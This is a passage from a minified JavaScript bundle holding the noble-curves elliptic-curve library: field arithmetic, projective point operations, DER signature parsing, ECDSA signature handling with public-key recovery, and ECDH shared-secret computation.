        EI(t, u, m, p, y)
    }
    function Cw(t, e, n, s, o, l, u) {
        return id(t),
        id(e),
        xI(t, e, {
            N: n,
            r: o,
            p: s,
            dkLen: l,
            onProgress: u
        })
    }
    /*! noble-curves - MIT License (c) 2022 Paul Miller (paulmillr.com) */
    const Iw = BigInt(0)
      , Jd = BigInt(1)
      , SI = BigInt(2);
    function Ms(t) {
        return t instanceof Uint8Array || t != null && typeof t == "object" && t.constructor.name === "Uint8Array"
    }
    function lc(t) {
        if (!Ms(t))
            throw new Error("Uint8Array expected")
    }
    const TI = Array.from({
        length: 256
    }, (t, e) => e.toString(16).padStart(2, "0"));
    function $a(t) {
        lc(t);
        let e = "";
        for (let n = 0; n < t.length; n++)
            e += TI[t[n]];
        return e
    }
    function kw(t) {
        const e = t.toString(16);
        return e.length & 1 ? `0${e}` : e
    }
    function m0(t) {
        if (typeof t != "string")
            throw new Error("hex string expected, got " + typeof t);
        return BigInt(t === "" ? "0" : `0x${t}`)
    }
    const qi = {
        _0: 48,
        _9: 57,
        _A: 65,
        _F: 70,
        _a: 97,
        _f: 102
    };
    function SA(t) {
        if (t >= qi._0 && t <= qi._9)
            return t - qi._0;
        if (t >= qi._A && t <= qi._F)
            return t - (qi._A - 10);
        if (t >= qi._a && t <= qi._f)
            return t - (qi._a - 10)
    }
    function Wa(t) {
        if (typeof t != "string")
            throw new Error("hex string expected, got " + typeof t);
        const e = t.length
          , n = e / 2;
        if (e % 2)
            throw new Error("padded hex string expected, got unpadded hex of length " + e);
        const s = new Uint8Array(n);
        for (let o = 0, l = 0; o < n; o++,
        l += 2) {
            const u = SA(t.charCodeAt(l))
              , d = SA(t.charCodeAt(l + 1));
            if (u === void 0 || d === void 0) {
                const p = t[l] + t[l + 1];
                throw new Error('hex string expected, got non-hex character "' + p + '" at index ' + l)
            }
            s[o] = u * 16 + d
        }
        return s
    }
    function Es(t) {
        return m0($a(t))
    }
    function p0(t) {
        return lc(t),
        m0($a(Uint8Array.from(t).reverse()))
    }
    function eo(t, e) {
        return Wa(t.toString(16).padStart(e * 2, "0"))
    }
    function g0(t, e) {
        return eo(t, e).reverse()
    }
    function RI(t) {
        return Wa(kw(t))
    }
    function $n(t, e, n) {
        let s;
        if (typeof e == "string")
            try {
                s = Wa(e)
            } catch (l) {
                throw new Error(`${t} must be valid hex string, got "${e}". Cause: ${l}`)
            }
        else if (Ms(e))
            s = Uint8Array.from(e);
        else
            throw new Error(`${t} must be hex string or Uint8Array`);
        const o = s.length;
        if (typeof n == "number" && o !== n)
            throw new Error(`${t} expected ${n} bytes, got ${o}`);
        return s
    }
    function Yl(...t) {
        let e = 0;
        for (let s = 0; s < t.length; s++) {
            const o = t[s];
            lc(o),
            e += o.length
        }
        const n = new Uint8Array(e);
        for (let s = 0, o = 0; s < t.length; s++) {
            const l = t[s];
            n.set(l, o),
            o += l.length
        }
        return n
    }
    function BI(t, e) {
        if (t.length !== e.length)
            return !1;
        let n = 0;
        for (let s = 0; s < t.length; s++)
            n |= t[s] ^ e[s];
        return n === 0
    }
    function CI(t) {
        if (typeof t != "string")
            throw new Error(`utf8ToBytes expected string, got ${typeof t}`);
        return new Uint8Array(new TextEncoder().encode(t))
    }
    function II(t) {
        let e;
        for (e = 0; t > Iw; t >>= Jd,
        e += 1)
            ;
        return e
    }
    function kI(t, e) {
        return t >> BigInt(e) & Jd
    }
    function OI(t, e, n) {
        return t | (n ? Jd : Iw) << BigInt(e)
    }
    const y0 = t => (SI << BigInt(t - 1)) - Jd
      , Um = t => new Uint8Array(t)
      , TA = t => Uint8Array.from(t);
    function Ow(t, e, n) {
        if (typeof t != "number" || t < 2)
            throw new Error("hashLen must be a number");
        if (typeof e != "number" || e < 2)
            throw new Error("qByteLen must be a number");
        if (typeof n != "function")
            throw new Error("hmacFn must be a function");
        let s = Um(t)
          , o = Um(t)
          , l = 0;
        const u = () => {
            s.fill(1),
            o.fill(0),
            l = 0
        }
          , d = (...y) => n(o, s, ...y)
          , p = (y=Um()) => {
            o = d(TA([0]), y),
            s = d(),
            y.length !== 0 && (o = d(TA([1]), y),
            s = d())
        }
          , h = () => {
            if (l++ >= 1e3)
                throw new Error("drbg: tried 1000 values");
            let y = 0;
            const w = [];
            for (; y < e; ) {
                s = d();
                const E = s.slice();
                w.push(E),
                y += s.length
            }
            return Yl(...w)
        }
        ;
        return (y, w) => {
            u(),
            p(y);
            let E;
            for (; !(E = w(h())); )
                p();
            return u(),
            E
        }
    }
    const NI = {
        bigint: t => typeof t == "bigint",
        function: t => typeof t == "function",
        boolean: t => typeof t == "boolean",
        string: t => typeof t == "string",
        stringOrUint8Array: t => typeof t == "string" || Ms(t),
        isSafeInteger: t => Number.isSafeInteger(t),
        array: t => Array.isArray(t),
        field: (t, e) => e.Fp.isValid(t),
        hash: t => typeof t == "function" && Number.isSafeInteger(t.outputLen)
    };
    function cc(t, e, n={}) {
        const s = (o, l, u) => {
            const d = NI[l];
            if (typeof d != "function")
                throw new Error(`Invalid validator "${l}", expected function`);
            const p = t[o];
            if (!(u && p === void 0) && !d(p, t))
                throw new Error(`Invalid param ${String(o)}=${p} (${typeof p}), expected ${l}`)
        }
        ;
        for (const [o,l] of Object.entries(e))
            s(o, l, !1);
        for (const [o,l] of Object.entries(n))
            s(o, l, !0);
        return t
    }
    const MI = Object.freeze(Object.defineProperty({
        __proto__: null,
        abytes: lc,
        bitGet: kI,
        bitLen: II,
        bitMask: y0,
        bitSet: OI,
        bytesToHex: $a,
        bytesToNumberBE: Es,
        bytesToNumberLE: p0,
        concatBytes: Yl,
        createHmacDrbg: Ow,
        ensureBytes: $n,
        equalBytes: BI,
        hexToBytes: Wa,
        hexToNumber: m0,
        isBytes: Ms,
        numberToBytesBE: eo,
        numberToBytesLE: g0,
        numberToHexUnpadded: kw,
        numberToVarBytesBE: RI,
        utf8ToBytes: CI,
        validateObject: cc
    }, Symbol.toStringTag, {
        value: "Module"
    }));
    /*! noble-curves - MIT License (c) 2022 Paul Miller (paulmillr.com) */
    const Ut = BigInt(0)
      , xt = BigInt(1)
      , ms = BigInt(2)
      , DI = BigInt(3)
      , dp = BigInt(4)
      , RA = BigInt(5)
      , BA = BigInt(8);
    BigInt(9);
    BigInt(16);
    function un(t, e) {
        const n = t % e;
        return n >= Ut ? n : e + n
    }
    function LI(t, e, n) {
        if (n <= Ut || e < Ut)
            throw new Error("Expected power/modulo > 0");
        if (n === xt)
            return Ut;
        let s = xt;
        for (; e > Ut; )
            e & xt && (s = s * t % n),
            t = t * t % n,
            e >>= xt;
        return s
    }
    function Hn(t, e, n) {
        let s = t;
        for (; e-- > Ut; )
            s *= s,
            s %= n;
        return s
    }
    function fp(t, e) {
        if (t === Ut || e <= Ut)
            throw new Error(`invert: expected positive integers, got n=${t} mod=${e}`);
        let n = un(t, e)
          , s = e
          , o = Ut
          , l = xt;
        for (; n !== Ut; ) {
            const d = s / n
              , p = s % n
              , h = o - l * d;
            s = n,
            n = p,
            o = l,
            l = h
        }
        if (s !== xt)
            throw new Error("invert: does not exist");
        return un(o, e)
    }
    function UI(t) {
        const e = (t - xt) / ms;
        let n, s, o;
        for (n = t - xt,
        s = 0; n % ms === Ut; n /= ms,
        s++)
            ;
        for (o = ms; o < t && LI(o, e, t) !== t - xt; o++)
            ;
        if (s === 1) {
            const u = (t + xt) / dp;
            return function(p, h) {
                const m = p.pow(h, u);
                if (!p.eql(p.sqr(m), h))
                    throw new Error("Cannot find square root");
                return m
            }
        }
        const l = (n + xt) / ms;
        return function(d, p) {
            if (d.pow(p, e) === d.neg(d.ONE))
                throw new Error("Cannot find square root");
            let h = s
              , m = d.pow(d.mul(d.ONE, o), n)
              , y = d.pow(p, l)
              , w = d.pow(p, n);
            for (; !d.eql(w, d.ONE); ) {
                if (d.eql(w, d.ZERO))
                    return d.ZERO;
                let E = 1;
                for (let _ = d.sqr(w); E < h && !d.eql(_, d.ONE); E++)
                    _ = d.sqr(_);
                const S = d.pow(m, xt << BigInt(h - E - 1));
                m = d.sqr(S),
                y = d.mul(y, S),
                w = d.mul(w, m),
                h = E
            }
            return y
        }
    }
    function jI(t) {
        if (t % dp === DI) {
            const e = (t + xt) / dp;
            return function(s, o) {
                const l = s.pow(o, e);
                if (!s.eql(s.sqr(l), o))
                    throw new Error("Cannot find square root");
                return l
            }
        }
        if (t % BA === RA) {
            const e = (t - RA) / BA;
            return function(s, o) {
                const l = s.mul(o, ms)
                  , u = s.pow(l, e)
                  , d = s.mul(o, u)
                  , p = s.mul(s.mul(d, ms), u)
                  , h = s.mul(d, s.sub(p, s.ONE));
                if (!s.eql(s.sqr(h), o))
                    throw new Error("Cannot find square root");
                return h
            }
        }
        return UI(t)
    }
    const PI = ["create", "isValid", "is0", "neg", "inv", "sqrt", "sqr", "eql", "add", "sub", "mul", "pow", "div", "addN", "subN", "mulN", "sqrN"];
    function HI(t) {
        const e = {
            ORDER: "bigint",
            MASK: "bigint",
            BYTES: "isSafeInteger",
            BITS: "isSafeInteger"
        }
          , n = PI.reduce( (s, o) => (s[o] = "function",
        s), e);
        return cc(t, n)
    }
    function zI(t, e, n) {
        if (n < Ut)
            throw new Error("Expected power > 0");
        if (n === Ut)
            return t.ONE;
        if (n === xt)
            return e;
        let s = t.ONE
          , o = e;
        for (; n > Ut; )
            n & xt && (s = t.mul(s, o)),
            o = t.sqr(o),
            n >>= xt;
        return s
    }
    function GI(t, e) {
        const n = new Array(e.length)
          , s = e.reduce( (l, u, d) => t.is0(u) ? l : (n[d] = l,
        t.mul(l, u)), t.ONE)
          , o = t.inv(s);
        return e.reduceRight( (l, u, d) => t.is0(u) ? l : (n[d] = t.mul(l, n[d]),
        t.mul(l, u)), o),
        n
    }
    function Nw(t, e) {
        const n = e !== void 0 ? e : t.toString(2).length
          , s = Math.ceil(n / 8);
        return {
            nBitLength: n,
            nByteLength: s
        }
    }
    function qI(t, e, n=!1, s={}) {
        if (t <= Ut)
            throw new Error(`Expected Field ORDER > 0, got ${t}`);
        const {nBitLength: o, nByteLength: l} = Nw(t, e);
        if (l > 2048)
            throw new Error("Field lengths over 2048 bytes are not supported");
        const u = jI(t)
          , d = Object.freeze({
            ORDER: t,
            BITS: o,
            BYTES: l,
            MASK: y0(o),
            ZERO: Ut,
            ONE: xt,
            create: p => un(p, t),
            isValid: p => {
                if (typeof p != "bigint")
                    throw new Error(`Invalid field element: expected bigint, got ${typeof p}`);
                return Ut <= p && p < t
            }
            ,
            is0: p => p === Ut,
            isOdd: p => (p & xt) === xt,
            neg: p => un(-p, t),
            eql: (p, h) => p === h,
            sqr: p => un(p * p, t),
            add: (p, h) => un(p + h, t),
            sub: (p, h) => un(p - h, t),
            mul: (p, h) => un(p * h, t),
            pow: (p, h) => zI(d, p, h),
            div: (p, h) => un(p * fp(h, t), t),
            sqrN: p => p * p,
            addN: (p, h) => p + h,
            subN: (p, h) => p - h,
            mulN: (p, h) => p * h,
            inv: p => fp(p, t),
            sqrt: s.sqrt || (p => u(d, p)),
            invertBatch: p => GI(d, p),
            cmov: (p, h, m) => m ? h : p,
            toBytes: p => n ? g0(p, l) : eo(p, l),
            fromBytes: p => {
                if (p.length !== l)
                    throw new Error(`Fp.fromBytes: expected ${l}, got ${p.length}`);
                return n ? p0(p) : Es(p)
            }
        });
        return Object.freeze(d)
    }
    function Mw(t) {
        if (typeof t != "bigint")
            throw new Error("field order must be bigint");
        const e = t.toString(2).length;
        return Math.ceil(e / 8)
    }
    function Dw(t) {
        const e = Mw(t);
        return e + Math.ceil(e / 2)
    }
    function FI(t, e, n=!1) {
        const s = t.length
          , o = Mw(e)
          , l = Dw(e);
        if (s < 16 || s < l || s > 1024)
            throw new Error(`expected ${l}-1024 bytes of input, got ${s}`);
        const u = n ? Es(t) : p0(t)
          , d = un(u, e - xt) + xt;
        return n ? g0(d, o) : eo(d, o)
    }
    /*! noble-curves - MIT License (c) 2022 Paul Miller (paulmillr.com) */
    const QI = BigInt(0)
      , jm = BigInt(1);
    function VI(t, e) {
        const n = (o, l) => {
            const u = l.negate();
            return o ? u : l
        }
          , s = o => {
            const l = Math.ceil(e / o) + 1
              , u = 2 ** (o - 1);
            return {
                windows: l,
                windowSize: u
            }
        }
        ;
        return {
            constTimeNegate: n,
            unsafeLadder(o, l) {
                let u = t.ZERO
                  , d = o;
                for (; l > QI; )
                    l & jm && (u = u.add(d)),
                    d = d.double(),
                    l >>= jm;
                return u
            },
            precomputeWindow(o, l) {
                const {windows: u, windowSize: d} = s(l)
                  , p = [];
                let h = o
                  , m = h;
                for (let y = 0; y < u; y++) {
                    m = h,
                    p.push(m);
                    for (let w = 1; w < d; w++)
                        m = m.add(h),
                        p.push(m);
                    h = m.double()
                }
                return p
            },
            wNAF(o, l, u) {
                const {windows: d, windowSize: p} = s(o);
                let h = t.ZERO
                  , m = t.BASE;
                const y = BigInt(2 ** o - 1)
                  , w = 2 ** o
                  , E = BigInt(o);
                for (let S = 0; S < d; S++) {
                    const _ = S * p;
                    let x = Number(u & y);
                    u >>= E,
                    x > p && (x -= w,
                    u += jm);
                    const b = _
                      , I = _ + Math.abs(x) - 1
                      , O = S % 2 !== 0
                      , z = x < 0;
                    x === 0 ? m = m.add(n(O, l[b])) : h = h.add(n(z, l[I]))
                }
                return {
                    p: h,
                    f: m
                }
            },
            wNAFCached(o, l, u, d) {
                const p = o._WINDOW_SIZE || 1;
                let h = l.get(o);
                return h || (h = this.precomputeWindow(o, p),
                p !== 1 && l.set(o, d(h))),
                this.wNAF(p, h, u)
            }
        }
    }
    function Lw(t) {
        return HI(t.Fp),
        cc(t, {
            n: "bigint",
            h: "bigint",
            Gx: "field",
            Gy: "field"
        }, {
            nBitLength: "isSafeInteger",
            nByteLength: "isSafeInteger"
        }),
        Object.freeze({
            ...Nw(t.n, t.nBitLength),
            ...t,
            p: t.Fp.ORDER
        })
    }
    /*! noble-curves - MIT License (c) 2022 Paul Miller (paulmillr.com) */
    function YI(t) {
        const e = Lw(t);
        cc(e, {
            a: "field",
            b: "field"
        }, {
            allowedPrivateKeyLengths: "array",
            wrapPrivateKey: "boolean",
            isTorsionFree: "function",
            clearCofactor: "function",
            allowInfinityPoint: "boolean",
            fromBytes: "function",
            toBytes: "function"
        });
        const {endo: n, Fp: s, a: o} = e;
        if (n) {
            if (!s.eql(o, s.ZERO))
                throw new Error("Endomorphism can only be defined for Koblitz curves that have a=0");
            if (typeof n != "object" || typeof n.beta != "bigint" || typeof n.splitScalar != "function")
                throw new Error("Expected endomorphism with beta: bigint and splitScalar: function")
        }
        return Object.freeze({
            ...e
        })
    }
    const {bytesToNumberBE: ZI, hexToBytes: KI} = MI
      , gs = {
        Err: class extends Error {
            constructor(e="") {
                super(e)
            }
        }
        ,
        _parseInt(t) {
            const {Err: e} = gs;
            if (t.length < 2 || t[0] !== 2)
                throw new e("Invalid signature integer tag");
            const n = t[1]
              , s = t.subarray(2, n + 2);
            if (!n || s.length !== n)
                throw new e("Invalid signature integer: wrong length");
            if (s[0] & 128)
                throw new e("Invalid signature integer: negative");
            if (s[0] === 0 && !(s[1] & 128))
                throw new e("Invalid signature integer: unnecessary leading zero");
            return {
                d: ZI(s),
                l: t.subarray(n + 2)
            }
        },
        toSig(t) {
            const {Err: e} = gs
              , n = typeof t == "string" ? KI(t) : t;
            lc(n);
            let s = n.length;
            if (s < 2 || n[0] != 48)
                throw new e("Invalid signature tag");
            if (n[1] !== s - 2)
                throw new e("Invalid signature: incorrect length");
            const {d: o, l} = gs._parseInt(n.subarray(2))
              , {d: u, l: d} = gs._parseInt(l);
            if (d.length)
                throw new e("Invalid signature: left bytes after parsing");
            return {
                r: o,
                s: u
            }
        },
        hexFromSig(t) {
            const e = h => Number.parseInt(h[0], 16) & 8 ? "00" + h : h
              , n = h => {
                const m = h.toString(16);
                return m.length & 1 ? `0${m}` : m
            }
              , s = e(n(t.s))
              , o = e(n(t.r))
              , l = s.length / 2
              , u = o.length / 2
              , d = n(l)
              , p = n(u);
            return `30${n(u + l + 4)}02${p}${o}02${d}${s}`
        }
    }
      , Ji = BigInt(0)
      , Gn = BigInt(1);
    BigInt(2);
    const CA = BigInt(3);
    BigInt(4);
    function XI(t) {
        const e = YI(t)
          , {Fp: n} = e
          , s = e.toBytes || ( (S, _, x) => {
            const b = _.toAffine();
            return Yl(Uint8Array.from([4]), n.toBytes(b.x), n.toBytes(b.y))
        }
        )
          , o = e.fromBytes || (S => {
            const _ = S.subarray(1)
              , x = n.fromBytes(_.subarray(0, n.BYTES))
              , b = n.fromBytes(_.subarray(n.BYTES, 2 * n.BYTES));
            return {
                x,
                y: b
            }
        }
        );
        function l(S) {
            const {a: _, b: x} = e
              , b = n.sqr(S)
              , I = n.mul(b, S);
            return n.add(n.add(I, n.mul(S, _)), x)
        }
        if (!n.eql(n.sqr(e.Gy), l(e.Gx)))
            throw new Error("bad generator point: equation left != right");
        function u(S) {
            return typeof S == "bigint" && Ji < S && S < e.n
        }
        function d(S) {
            if (!u(S))
                throw new Error("Expected valid bigint: 0 < bigint < curve.n")
        }
        function p(S) {
            const {allowedPrivateKeyLengths: _, nByteLength: x, wrapPrivateKey: b, n: I} = e;
            if (_ && typeof S != "bigint") {
                if (Ms(S) && (S = $a(S)),
                typeof S != "string" || !_.includes(S.length))
                    throw new Error("Invalid key");
                S = S.padStart(x * 2, "0")
            }
            let O;
            try {
                O = typeof S == "bigint" ? S : Es($n("private key", S, x))
            } catch {
                throw new Error(`private key must be ${x} bytes, hex or bigint, not ${typeof S}`)
            }
            return b && (O = un(O, I)),
            d(O),
            O
        }
        const h = new Map;
        function m(S) {
            if (!(S instanceof y))
                throw new Error("ProjectivePoint expected")
        }
        class y {
            constructor(_, x, b) {
                if (this.px = _,
                this.py = x,
                this.pz = b,
                _ == null || !n.isValid(_))
                    throw new Error("x required");
                if (x == null || !n.isValid(x))
                    throw new Error("y required");
                if (b == null || !n.isValid(b))
                    throw new Error("z required")
            }
            static fromAffine(_) {
                const {x, y: b} = _ || {};
                if (!_ || !n.isValid(x) || !n.isValid(b))
                    throw new Error("invalid affine point");
                if (_ instanceof y)
                    throw new Error("projective point not allowed");
                const I = O => n.eql(O, n.ZERO);
                return I(x) && I(b) ? y.ZERO : new y(x,b,n.ONE)
            }
            get x() {
                return this.toAffine().x
            }
            get y() {
                return this.toAffine().y
            }
            static normalizeZ(_) {
                const x = n.invertBatch(_.map(b => b.pz));
                return _.map( (b, I) => b.toAffine(x[I])).map(y.fromAffine)
            }
            static fromHex(_) {
                const x = y.fromAffine(o($n("pointHex", _)));
                return x.assertValidity(),
                x
            }
            static fromPrivateKey(_) {
                return y.BASE.multiply(p(_))
            }
            _setWindowSize(_) {
                this._WINDOW_SIZE = _,
                h.delete(this)
            }
            assertValidity() {
                if (this.is0()) {
                    if (e.allowInfinityPoint && !n.is0(this.py))
                        return;
                    throw new Error("bad point: ZERO")
                }
                const {x: _, y: x} = this.toAffine();
                if (!n.isValid(_) || !n.isValid(x))
                    throw new Error("bad point: x or y not FE");
                const b = n.sqr(x)
                  , I = l(_);
                if (!n.eql(b, I))
                    throw new Error("bad point: equation left != right");
                if (!this.isTorsionFree())
                    throw new Error("bad point: not in prime-order subgroup")
            }
            hasEvenY() {
                const {y: _} = this.toAffine();
                if (n.isOdd)
                    return !n.isOdd(_);
                throw new Error("Field doesn't support isOdd")
            }
            equals(_) {
                m(_);
                const {px: x, py: b, pz: I} = this
                  , {px: O, py: z, pz: L} = _
                  , Y = n.eql(n.mul(x, L), n.mul(O, I))
                  , W = n.eql(n.mul(b, L), n.mul(z, I));
                return Y && W
            }
            negate() {
                return new y(this.px,n.neg(this.py),this.pz)
            }
            double() {
                const {a: _, b: x} = e
                  , b = n.mul(x, CA)
                  , {px: I, py: O, pz: z} = this;
                let L = n.ZERO
                  , Y = n.ZERO
                  , W = n.ZERO
                  , D = n.mul(I, I)
                  , se = n.mul(O, O)
                  , Z = n.mul(z, z)
                  , oe = n.mul(I, O);
                return oe = n.add(oe, oe),
                W = n.mul(I, z),
                W = n.add(W, W),
                L = n.mul(_, W),
                Y = n.mul(b, Z),
                Y = n.add(L, Y),
                L = n.sub(se, Y),
                Y = n.add(se, Y),
                Y = n.mul(L, Y),
                L = n.mul(oe, L),
                W = n.mul(b, W),
                Z = n.mul(_, Z),
                oe = n.sub(D, Z),
                oe = n.mul(_, oe),
                oe = n.add(oe, W),
                W = n.add(D, D),
                D = n.add(W, D),
                D = n.add(D, Z),
                D = n.mul(D, oe),
                Y = n.add(Y, D),
                Z = n.mul(O, z),
                Z = n.add(Z, Z),
                D = n.mul(Z, oe),
                L = n.sub(L, D),
                W = n.mul(Z, se),
                W = n.add(W, W),
                W = n.add(W, W),
                new y(L,Y,W)
            }
            add(_) {
                m(_);
                const {px: x, py: b, pz: I} = this
                  , {px: O, py: z, pz: L} = _;
                let Y = n.ZERO
                  , W = n.ZERO
                  , D = n.ZERO;
                const se = e.a
                  , Z = n.mul(e.b, CA);
                let oe = n.mul(x, O)
                  , le = n.mul(b, z)
                  , ve = n.mul(I, L)
                  , ze = n.add(x, b)
                  , B = n.add(O, z);
                ze = n.mul(ze, B),
                B = n.add(oe, le),
                ze = n.sub(ze, B),
                B = n.add(x, I);
                let T = n.add(O, L);
                return B = n.mul(B, T),
                T = n.add(oe, ve),
                B = n.sub(B, T),
                T = n.add(b, I),
                Y = n.add(z, L),
                T = n.mul(T, Y),
                Y = n.add(le, ve),
                T = n.sub(T, Y),
                D = n.mul(se, B),
                Y = n.mul(Z, ve),
                D = n.add(Y, D),
                Y = n.sub(le, D),
                D = n.add(le, D),
                W = n.mul(Y, D),
                le = n.add(oe, oe),
                le = n.add(le, oe),
                ve = n.mul(se, ve),
                B = n.mul(Z, B),
                le = n.add(le, ve),
                ve = n.sub(oe, ve),
                ve = n.mul(se, ve),
                B = n.add(B, ve),
                oe = n.mul(le, B),
                W = n.add(W, oe),
                oe = n.mul(T, B),
                Y = n.mul(ze, Y),
                Y = n.sub(Y, oe),
                oe = n.mul(ze, le),
                D = n.mul(T, D),
                D = n.add(D, oe),
                new y(Y,W,D)
            }
            subtract(_) {
                return this.add(_.negate())
            }
            is0() {
                return this.equals(y.ZERO)
            }
            wNAF(_) {
                return E.wNAFCached(this, h, _, x => {
                    const b = n.invertBatch(x.map(I => I.pz));
                    return x.map( (I, O) => I.toAffine(b[O])).map(y.fromAffine)
                }
                )
            }
            multiplyUnsafe(_) {
                const x = y.ZERO;
                if (_ === Ji)
                    return x;
                if (d(_),
                _ === Gn)
                    return this;
                const {endo: b} = e;
                if (!b)
                    return E.unsafeLadder(this, _);
                let {k1neg: I, k1: O, k2neg: z, k2: L} = b.splitScalar(_)
                  , Y = x
                  , W = x
                  , D = this;
                for (; O > Ji || L > Ji; )
                    O & Gn && (Y = Y.add(D)),
                    L & Gn && (W = W.add(D)),
                    D = D.double(),
                    O >>= Gn,
                    L >>= Gn;
                return I && (Y = Y.negate()),
                z && (W = W.negate()),
                W = new y(n.mul(W.px, b.beta),W.py,W.pz),
                Y.add(W)
            }
            multiply(_) {
                d(_);
                let x = _, b, I;
                const {endo: O} = e;
                if (O) {
                    const {k1neg: z, k1: L, k2neg: Y, k2: W} = O.splitScalar(x);
                    let {p: D, f: se} = this.wNAF(L)
                      , {p: Z, f: oe} = this.wNAF(W);
                    D = E.constTimeNegate(z, D),
                    Z = E.constTimeNegate(Y, Z),
                    Z = new y(n.mul(Z.px, O.beta),Z.py,Z.pz),
                    b = D.add(Z),
                    I = se.add(oe)
                } else {
                    const {p: z, f: L} = this.wNAF(x);
                    b = z,
                    I = L
                }
                return y.normalizeZ([b, I])[0]
            }
            multiplyAndAddUnsafe(_, x, b) {
                const I = y.BASE
                  , O = (L, Y) => Y === Ji || Y === Gn || !L.equals(I) ? L.multiplyUnsafe(Y) : L.multiply(Y)
                  , z = O(this, x).add(O(_, b));
                return z.is0() ? void 0 : z
            }
            toAffine(_) {
                const {px: x, py: b, pz: I} = this
                  , O = this.is0();
                _ == null && (_ = O ? n.ONE : n.inv(I));
                const z = n.mul(x, _)
                  , L = n.mul(b, _)
                  , Y = n.mul(I, _);
                if (O)
                    return {
                        x: n.ZERO,
                        y: n.ZERO
                    };
                if (!n.eql(Y, n.ONE))
                    throw new Error("invZ was invalid");
                return {
                    x: z,
                    y: L
                }
            }
            isTorsionFree() {
                const {h: _, isTorsionFree: x} = e;
                if (_ === Gn)
                    return !0;
                if (x)
                    return x(y, this);
                throw new Error("isTorsionFree() has not been declared for the elliptic curve")
            }
            clearCofactor() {
                const {h: _, clearCofactor: x} = e;
                return _ === Gn ? this : x ? x(y, this) : this.multiplyUnsafe(e.h)
            }
            toRawBytes(_=!0) {
                return this.assertValidity(),
                s(y, this, _)
            }
            toHex(_=!0) {
                return $a(this.toRawBytes(_))
            }
        }
        y.BASE = new y(e.Gx,e.Gy,n.ONE),
        y.ZERO = new y(n.ZERO,n.ONE,n.ZERO);
        const w = e.nBitLength
          , E = VI(y, e.endo ? Math.ceil(w / 2) : w);
        return {
            CURVE: e,
            ProjectivePoint: y,
            normPrivateKeyToScalar: p,
            weierstrassEquation: l,
            isWithinCurveOrder: u
        }
    }
    function JI(t) {
        const e = Lw(t);
        return cc(e, {
            hash: "hash",
            hmac: "function",
            randomBytes: "function"
        }, {
            bits2int: "function",
            bits2int_modN: "function",
            lowS: "boolean"
        }),
        Object.freeze({
            lowS: !0,
            ...e
        })
    }
    function $I(t) {
        const e = JI(t)
          , {Fp: n, n: s} = e
          , o = n.BYTES + 1
          , l = 2 * n.BYTES + 1;
        function u(B) {
            return Ji < B && B < n.ORDER
        }
        function d(B) {
            return un(B, s)
        }
        function p(B) {
            return fp(B, s)
        }
        const {ProjectivePoint: h, normPrivateKeyToScalar: m, weierstrassEquation: y, isWithinCurveOrder: w} = XI({
            ...e,
            toBytes(B, T, P) {
                const J = T.toAffine()
                  , ie = n.toBytes(J.x)
                  , R = Yl;
                return P ? R(Uint8Array.from([T.hasEvenY() ? 2 : 3]), ie) : R(Uint8Array.from([4]), ie, n.toBytes(J.y))
            },
            fromBytes(B) {
                const T = B.length
                  , P = B[0]
                  , J = B.subarray(1);
                if (T === o && (P === 2 || P === 3)) {
                    const ie = Es(J);
                    if (!u(ie))
                        throw new Error("Point is not on curve");
                    const R = y(ie);
                    let F;
                    try {
                        F = n.sqrt(R)
                    } catch (re) {
                        const he = re instanceof Error ? ": " + re.message : "";
                        throw new Error("Point is not on curve" + he)
                    }
                    const ne = (F & Gn) === Gn;
                    return (P & 1) === 1 !== ne && (F = n.neg(F)),
                    {
                        x: ie,
                        y: F
                    }
                } else if (T === l && P === 4) {
                    const ie = n.fromBytes(J.subarray(0, n.BYTES))
                      , R = n.fromBytes(J.subarray(n.BYTES, 2 * n.BYTES));
                    return {
                        x: ie,
                        y: R
                    }
                } else
                    throw new Error(`Point of length ${T} was invalid. Expected ${o} compressed bytes or ${l} uncompressed bytes`)
            }
        })
          , E = B => $a(eo(B, e.nByteLength));
        function S(B) {
            const T = s >> Gn;
            return B > T
        }
        function _(B) {
            return S(B) ? d(-B) : B
        }
        const x = (B, T, P) => Es(B.slice(T, P));
        class b {
            constructor(T, P, J) {
                this.r = T,
                this.s = P,
                this.recovery = J,
                this.assertValidity()
            }
            static fromCompact(T) {
                const P = e.nByteLength;
                return T = $n("compactSignature", T, P * 2),
                new b(x(T, 0, P),x(T, P, 2 * P))
            }
            static fromDER(T) {
                const {r: P, s: J} = gs.toSig($n("DER", T));
                return new b(P,J)
            }
            assertValidity() {
                if (!w(this.r))
                    throw new Error("r must be 0 < r < CURVE.n");
                if (!w(this.s))
                    throw new Error("s must be 0 < s < CURVE.n")
            }
            addRecoveryBit(T) {
                return new b(this.r,this.s,T)
            }
            recoverPublicKey(T) {
                const {r: P, s: J, recovery: ie} = this
                  , R = W($n("msgHash", T));
                if (ie == null || ![0, 1, 2, 3].includes(ie))
                    throw new Error("recovery id invalid");
                const F = ie === 2 || ie === 3 ? P + e.n : P;
                if (F >= n.ORDER)
                    throw new Error("recovery id 2 or 3 invalid");
                const ne = (ie & 1) === 0 ? "02" : "03"
                  , ae = h.fromHex(ne + E(F))
                  , re = p(F)
                  , he = d(-R * re)
                  , ye = d(J * re)
                  , ut = h.BASE.multiplyAndAddUnsafe(ae, he, ye);
                if (!ut)
                    throw new Error("point at infinify");
                return ut.assertValidity(),
                ut
            }
            hasHighS() {
                return S(this.s)
            }
            normalizeS() {
                return this.hasHighS() ? new b(this.r,d(-this.s),this.recovery) : this
            }
            toDERRawBytes() {
                return Wa(this.toDERHex())
            }
            toDERHex() {
                return gs.hexFromSig({
                    r: this.r,
                    s: this.s
                })
            }
            toCompactRawBytes() {
                return Wa(this.toCompactHex())
            }
            toCompactHex() {
                return E(this.r) + E(this.s)
            }
        }
        const I = {
            isValidPrivateKey(B) {
                try {
                    return m(B),
                    !0
                } catch {
                    return !1
                }
            },
            normPrivateKeyToScalar: m,
            randomPrivateKey: () => {
                const B = Dw(e.n);
                return FI(e.randomBytes(B), e.n)
            }
            ,
            precompute(B=8, T=h.BASE) {
                return T._setWindowSize(B),
                T.multiply(BigInt(3)),
                T
            }
        };
        function O(B, T=!0) {
            return h.fromPrivateKey(B).toRawBytes(T)
        }
        function z(B) {
            const T = Ms(B)
              , P = typeof B == "string"
              , J = (T || P) && B.length;
            return T ? J === o || J === l : P ? J === 2 * o || J === 2 * l : B instanceof h
        }
        function L(B, T, P=!0) {
            if (z(B))
                throw new Error("first arg must be private key");
            if (!z(T))
                throw new Error("second arg must be public key");
            return h.fromHex(T).multiply(m(B)).toRawBytes(P)
        }
        const Y = e.bits2int || function(B) {
            const T = Es(B)
              , P = B.length * 8 - e.nBitLength;
